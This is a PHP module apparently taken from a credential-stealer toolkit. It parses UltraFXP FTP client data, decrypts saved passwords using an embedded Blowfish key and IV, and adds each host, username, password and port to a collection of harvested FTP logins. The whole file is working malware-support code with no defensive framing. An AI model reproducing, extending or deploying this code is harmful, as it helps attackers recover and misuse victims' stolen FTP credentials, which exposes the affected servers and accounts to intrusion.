<?php
class Module_ultrafxp extends Module_
{
    private function Decrypt($Password)
    {
        if (!strlen($Password))
            return '';

        $DecPW = hex2bin(trim($Password));

        if ($DecPW === false)
        {
            return '';
        }

        $CONIV_ = chr(59).chr(197).chr(31).chr(90).chr(94).chr(150).chr(19).chr(69);
        $KEY_ = hex2bin("B4E8D16C26323D4AEA8026CDCEBFFE6A4AE27DEB77F0894CBC25FA03E01B6B1C");
        $IV_ = $CONIV_;

        $MDecript = mcrypt_module_open(MCRYPT_BLOWFISH, '', 'ecb', '');
        if (!$MDecript)
            return '';

        mcrypt_generic_init($MDecript, $KEY_, $IV_);
        encrypt_cts($MDecript, $KEY_, $IV_);

        $IV_ = $CONIV_;
        $PWResult = decrypt_cts($MDecript, $DecPW, $IV_);

        mcrypt_generic_deinit($MDecript);
        mcrypt_module_close($MDecript);

        return $PWResult;
    }

    function ProcessItem($Element)
    {
        $Host = $Element->HOST;
        $User = $Element->USER;
        $Pass = $this->Decrypt($Element->PASS);
        $Port = $Element->PORT;
        $Prot = 0;

        if(isset($Element->SSL))
            $Prot = $Element->SSL;

        $this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == 4) , $Port), $User, $Pass);
    }
    function ProcessItems($Elements)
    {
        if(isset($Elements->HOST))
        {
            $this->ProcessItem($Elements);
            return;
        }

        foreach($Elements->children() as $Element)
        {
            if(isset($Element->HOST))
            {
                $this->ProcessItem($Element);
            }
            else
            {
                if(!empty($Element))
                    $this->ProcessItems($Element);
            }
        }
    }
	
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
			$XML_ = simplexml_load_string($Data);
			if(!$XML_)
				return FALSE;

			$this->ProcessItems($XML_);
			$XML_ = NULL;
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
